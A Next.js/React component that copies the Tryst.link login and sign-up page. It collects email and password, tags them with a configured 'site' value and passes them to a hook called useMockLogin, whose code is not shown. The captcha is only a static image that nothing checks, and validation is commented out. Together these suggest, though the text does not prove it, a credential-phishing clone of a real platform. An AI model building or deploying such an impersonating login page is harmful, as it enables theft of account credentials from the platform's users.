import { Field, Form, Formik } from "formik";
import Image from "next/image";
import { site } from "../config";
import useMockLogin from "../hooks/useMockLogin";
import Captcha from "../public/images/captcha.svg";
import InputField from "./InputField";

function Content() {
  const initialvalues = {
    email: "",
    password: "",
    characters: "",
    remember: "",
  };

  const { login } = useMockLogin();

  const handleSubmit = (values, formik) => {
    const { email, password } = values;

    const submitValues = {
      site: site,
      email: email,
      password: password,
      skipcode: "",
    };

    login(submitValues, formik);

    // console.log(submitValues);
  };

  return (
    <div className="container px-5 lg:px-0 mt-[20px] lg:mt-[45px] mb-[30px] lg:mb-[70px]">
      <div className=" grid grid-cols-1 lg:grid-cols-2 gap-[30px] lg:gap-[65px] text-custom-gray3">
        <div>
          <div>
            <h1 className="font-Assistant text-[26px] lg:text-[34px]  font-extrabold">
              Log in
            </h1>
          </div>

          <div className="mt-[20px] lg:mt-[27px]">
            <Formik
              initialValues={initialvalues}
              // validationSchema={validate}
              onSubmit={handleSubmit}
            >
              {(formik) => (
                <Form className="">
                  <div className="space-y-[40px]">
                    <InputField
                      label="Email Address"
                      id="email"
                      name="email"
                      type="email"
                    />
                    <InputField
                      label="Password"
                      id="password"
                      name="password"
                      type="password"
                      autoComplete="on"
                    />
                    <InputField
                      label="* Please enter the characters shown inside the blue box"
                      id="characters"
                      name="characters"
                      type="text"
                      required
                    >
                      <div className="w-[153px] h-[53px] border-2 border-blue-600 mb-1">
                        <Image src={Captcha} />
                      </div>
                    </InputField>
                    <div className="flex items-center gap-1 text-sm">
                      <Field type="checkbox" name="remember" id="remember" />
                      <label
                        htmlFor="remember"
                        className="font-bold tracking-wide"
                      >
                        Remember me for 14 days
                      </label>
                    </div>
                  </div>

                  <div className="mt-[70px] w-[80px] flex flex-col justify-start font-Assistant text-[24px] text-[#5d738d] uppercase font-medium">
                    <button
                      type="submit"
                      className="bg-[#972c37]  py-2 text-white  rounded-md "
                      // disabled={!verified}
                    >
                      Log in
                    </button>
                  </div>
                </Form>
              )}
            </Formik>
            <div className="mt-[50px] text-base flex justify-start flex-col  px-[22px] lg:px-0">
              <div className="">
                <button className="px-3 py-2 bg-gray-200 rounded-md hover:bg-gray-500 hover:text-white">
                  Forgot your password?
                </button>
              </div>
              <div className="mt-3">
                <button className="px-3 py-2 bg-gray-200 rounded-md hover:bg-gray-500 hover:text-white">
                  Didn't receive confirmation instructions?
                </button>
              </div>
              <div className="mt-3">
                <button className="px-3 py-2 bg-gray-200 rounded-md hover:bg-gray-500 hover:text-white">
                  I need help recovering access to my account
                </button>
              </div>
            </div>
          </div>
        </div>
        <div>
          <div>
            <h1 className="font-Assistant text-[26px] lg:text-[34px]  font-extrabold">
              Sign up
            </h1>
          </div>

          <div className="mt-3 text-[15px] space-y-5">
            <p className="">
              Tryst.link is one of the fastest-growing escort platforms in the
              world. Built by the same team behind{" "}
              <span className="underline hover:text-custom-red transition duration-300 cursor-pointer">
                Switter!
              </span>
            </p>
            <p>
              {`Please select which type of account you'd like to sign up for:`}
            </p>
          </div>

          <div className="mt-[23px] flex  gap-[10px]  items-center">
            <div className="">
              <button className="px-3 py-2 bg-gray-200 rounded-md">
                I am a provider
              </button>
            </div>
            <div className="">
              <button className="px-3 py-2 bg-gray-200 rounded-md">
                I am a client
              </button>
            </div>
          </div>
        </div>
      </div>
    </div>
  );
}

export default Content;
